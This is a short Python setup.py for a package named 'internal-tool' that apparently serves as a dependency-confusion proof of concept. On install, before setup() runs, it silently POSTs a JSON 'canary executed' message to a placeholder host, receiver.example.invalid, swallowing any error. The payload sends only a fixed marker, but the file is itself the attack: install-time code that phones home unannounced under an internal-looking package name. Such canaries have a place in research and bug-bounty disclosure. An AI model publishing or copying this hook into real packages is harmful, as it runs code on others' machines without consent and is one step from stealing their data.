import json
import urllib.request

try:
    details = {"proof": "dependency-confusion-canary-executed", "version": "1.2.3"}
    data = {"source_type": "pip", "package": "internal-tool", "details": details}
    req = urllib.request.Request(
        "https://receiver.example.invalid/api/pings",
        data=json.dumps(data).encode(),
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    urllib.request.urlopen(req, timeout=5)
except Exception:
    pass

from setuptools import setup
setup(name="internal-tool", version="1.2.3")
